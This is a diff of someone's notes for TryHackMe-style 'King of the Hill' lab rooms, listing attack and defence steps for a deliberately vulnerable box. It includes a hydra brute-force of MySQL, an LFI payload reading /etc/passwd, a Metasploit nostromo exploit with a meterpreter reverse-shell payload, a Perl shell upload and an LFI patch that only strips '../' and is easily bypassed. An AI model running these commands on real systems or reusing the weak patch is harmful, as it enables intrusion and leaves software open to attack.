@@ -1,27 +1,43 @@
 
-Prepare
-- mkdir ~/Prohacks/THM/Room
-- cd ~/Prohacks/THM/Room
-- sudo set.target.ip x.x.x.x
-- nmap.target.ip
-"""----------------------------------------------------------------------------------------------------------------------"""
+# King of The Hill
+
 Attacking
+- Ready
+    - ssh-keygen -f "/home/$USER/.ssh/known_hosts" -R "target.ip"
+    - mkdir ~/THM/<Room>
+    - cd ~/THM/<Room>touch
+    - ~/THM/<Room>/clue.txt
 - Recon
 - Port
-    - 80
-    - 1337
-    - 3306
-    - 5555
-    - 8080
-    - 9999
-    - 24964
+    - sudo set.target.ip <x.x.x.x>
+    - nmap.target.ip
+        - 22
+        - 80
+        - 110
+        - 143
+        - 139/445
+        - 1337
+        - 3306
+        - 5555
+        - 8080
+        - 9999
+        - 24964
 - Scan
+    - 22/tcp  open  ssh        syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
     - 80/tcp    open  http       syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
-        - /upload
-        - Insecure File Upload "Perl shell"
+        - /robots.txt
+        - /sitemap.xml
+        - view-source
+        - gobuster
+            - /upload
+            - Insecure File Upload Perl shell
+        - nikto -h target.ip
+        - wpscan
+        - hydra
+        - Burp Suite
     - 1337/tcp  open  ssh        syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
     - 3306/tcp  open  mysql      syn-ack ttl 61 MySQL 5.7.19-0ubuntu0.16.04.1
-        - hydra -l root -P /usr/share/wordlists/rockyou.txt <MACHINE_IP> mysql
+        - hydra -l root -P /usr/share/wordlists/rockyou.txt target.ip mysql
     - 5555/tcp  open  http       syn-ack ttl 61 nginx 1.10.3 (Ubuntu)
         - The page variable is the one defining on which page we are /?page=posts.php
             - http://MACHINE_IP:5555/?page=../../../etc/passwd
@@ -43,13 +59,16 @@ Attacking
     - msfconsole
         - use exploit/multi/http/nostromo_code_exec
         - set rport 8080
-        - set rhost <MACHINE_IP>
+        - set rhost target.ip
         - check
         - set payload linux/x86/meterpreter/reverse_tcp
         - set lhost tun0
         - run
     - reverse shell
         - Upload "Perl shell" /upload
+        - Stablish by using Python’s Pty module
+            - python3 -c 'import pty;pty.spawn("/bin/bash");'
+            - export TERM=xterm
 - Root   
     - Privilege Escalation
         - looking for root permissions
@@ -93,7 +112,7 @@ Defending
             - ps aux | grep nhttpd
             - kill -9 <PID>
             - cd /var/nostromo/htdocs
-            - python3 -m http.server -b <MACHINE_IP> 8080
+            - python3 -m http.server -b target.ip 8080
     - LFI Patch, port 5555 
         - removing every ../ from the page variable
             - <?php include($_GET["page"]); ?> To <?php include(str_replace("../","",$_GET["page"])); ?>
